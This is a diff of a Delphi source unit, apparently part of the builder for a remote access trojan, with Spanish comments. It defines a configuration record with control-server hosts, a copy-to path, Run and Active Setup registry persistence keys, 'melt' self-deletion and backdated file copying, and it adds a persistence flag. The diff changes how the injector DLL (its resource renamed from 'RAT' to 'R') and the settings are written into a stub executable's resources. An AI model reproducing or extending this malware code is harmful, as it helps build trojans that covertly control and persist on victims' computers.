@@ -18,7 +18,7 @@ type
   TSettings = record
     sHosts, sID, sFileNameToCopy, sCopyTo, sRunRegKeyName, snumerocifrado,snumerocifrado2,sPluginName,sInyectadorFile{No forma parte de la configuración, se usa para saber la localización del inyector},sActiveSetupKeyName: string[255];
     //Cadena de 255 caracteres
-    bCopiarArchivo, bMelt, bArranqueRun, bCopiarConFechaAnterior, bCerrar, bCerrarMonitor, bArranqueActiveSetup: boolean;
+    bCopiarArchivo, bMelt, bArranqueRun, bCopiarConFechaAnterior, bCerrar, bCerrarMonitor, bArranqueActiveSetup, bPersistencia: boolean;
     InyectorHandle : Thandle;
   end;
   PSettings = ^TSettings;
@@ -26,24 +26,22 @@ type
 const
   RC_SETTINGS = 'CFG';
 
-function WriteSettings(Filename: PChar; Settings: PSettings;monitor:string;conectador:string): boolean;
+function WriteSettings(Filename: PChar; Settings: PSettings;conectador:string): boolean;
 function ReadSettings(var Settings: PSettings): boolean;
 
 implementation
 
 // Escribe la configuración en el archivo especificado
-function WriteSettings(Filename: PChar; Settings: PSettings;monitor:string;conectador:string): boolean;
+function WriteSettings(Filename: PChar; Settings: PSettings;conectador:string): boolean;
 var
   hResource: THandle;
 begin
   Result    := False;
-  hResource := BeginUpdateResource(Filename, True);
+  hResource := BeginUpdateResource(Filename, false);
   if hResource <> 0 then
   begin
-    if(length(monitor) >0) then
-      UpdateResource(hResource, 'DLL', 'MONITOR', 0, pointer(monitor),length(monitor));
     if(length(conectador) >0) then
-      UpdateResource(hResource, 'DLL', 'RAT', 0, pointer(conectador),length(conectador));
+      UpdateResource(hResource, 'DLL', 'R', 0, pointer(conectador),length(conectador));
     if UpdateResource(hResource, RT_RCDATA, RC_SETTINGS, 0, Settings,
       SizeOf(Settings^)) then
       Result := True;
